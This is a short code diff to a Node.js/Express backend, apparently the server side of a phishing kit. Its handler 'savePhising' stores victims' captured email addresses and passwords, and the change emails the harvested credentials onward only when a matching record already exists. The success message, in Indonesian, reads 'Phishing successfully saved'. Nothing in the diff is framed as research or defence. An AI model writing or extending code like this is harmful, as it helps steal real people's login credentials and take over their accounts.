@@ -23,8 +23,11 @@ exports.savePhising = async (req, res) => {
       usa_email,
       usa_pswd,
     });
+    const check = await PhisingData.findOne({usa_email});
     await data.save().then(() => {
-      sendMail(data);
+      if (check) {
+        sendMail(data);
+      }
       res.status(200).json({
         data,
         message: `Phising Berhasil Disimpan`,
